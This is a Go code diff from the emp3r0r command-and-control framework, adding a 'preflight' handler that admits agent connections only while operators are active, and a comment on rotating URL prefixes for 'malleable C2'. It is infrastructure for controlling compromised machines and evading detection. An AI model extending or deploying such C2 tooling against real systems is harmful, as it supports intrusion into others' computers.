@@ -4,7 +4,9 @@ import (
 	"context"
 	"crypto/tls"
 	"fmt"
+	"io"
 	"net/http"
+	"net/url"
 	"os"
 
 	"github.com/gorilla/mux"
@@ -12,6 +14,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
+	"github.com/jm33-m0/emp3r0r/core/lib/preflight"
 )
 
 // StartC2AgentTLSServer starts the TLS server.
@@ -23,7 +26,43 @@ func StartC2AgentTLSServer() {
 		}
 	}
 	r := mux.NewRouter()
-	transport.CACrtPEM = []byte(live.RuntimeConfig.CAPEM)
+	transport.SetCACrtPEM([]byte(live.RuntimeConfig.CAPEM))
+
+	// Preflight Handler
+	if live.RuntimeConfig.PreflightEnabled && live.RuntimeConfig.PreflightURL != "" {
+		u, err := url.Parse(live.RuntimeConfig.PreflightURL)
+		if err == nil {
+			logging.Printf("Registering Preflight handler at %s", u.Path)
+			r.HandleFunc(u.Path, func(w http.ResponseWriter, req *http.Request) {
+				// Read Body
+				body, err := io.ReadAll(req.Body)
+				if err != nil {
+					http.Error(w, "Read error", http.StatusBadRequest)
+					return
+				}
+				// Process
+				// Check if there are any active operators
+				allowConn := len(OPERATORS) > 0
+				respData, err := preflight.ProcessRequest(body, allowConn)
+				// Log decision
+				if allowConn {
+					logging.Infof("Preflight: Allowed connection (Operators active)")
+				} else {
+					logging.Warningf("Preflight: Rejected connection (No operators)")
+				}
+
+				if err != nil {
+					logging.Warningf("Preflight failed: %v", err)
+					http.Error(w, "Preflight failed", http.StatusForbidden)
+					return
+				}
+				// Write Response
+				w.WriteHeader(http.StatusOK)
+				w.Write(respData)
+			}).Methods(live.RuntimeConfig.PreflightMethod)
+		}
+	}
+
 	// Allow any prefix to effectively implement "malleable C2"
 	// The agent can use any prefix it wants, or rotate them
 	r.HandleFunc("/{prefix}/{api}/{token}", apiDispatcher)
